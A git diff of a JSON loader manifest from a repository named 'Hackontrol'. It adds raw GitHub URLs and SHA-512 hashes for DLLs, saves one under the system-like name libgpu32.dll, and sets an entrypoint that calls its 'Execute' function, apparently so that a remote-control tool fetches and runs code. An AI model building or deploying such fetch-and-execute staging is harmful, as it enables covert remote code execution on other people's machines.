@@ -1,15 +1,20 @@
 {
 	"self": {
+		"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libdll32.dll",
+		"sha512": "814d610711394446072287276e58b3b21cfb1f4372663567dc5bcbe3e1b2de5678993d288c678490dc10539f565e91b5aaeecffe169e4ab95e8da8e84f9db137"
+	},
+
+	"file": {
+		"file": "libgpu32.dll",
 		"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/GPURender.dll",
-		"sha512": "94810515daeb6abecb8a437ffe868aa586bb8d57f99ee4107377addaf81a76b277f8a3c65b296fae2517ab430a663d5c450cf12ccd28300dd7d10af14495cc57"
+		"sha512": "711979b566c85d9a64fa55978df6cbf67a0b65e3eeabc455fe2775c2017b50e1876eda568ea6033d97b76ef8b531f5c684012044d3e3cce82eba2820787dfdc1"
 	},
 
 	"entrypoint": [
 		{
 			"format": "dll",
-			"file": "D:\\GitHub Repository\\Hackontrol\\release\\GPURender.dll",
+			"file": "libgpu32.dll",
 			"function": "Execute",
-			"absolute": true,
 			"join": true
 		},
 		{
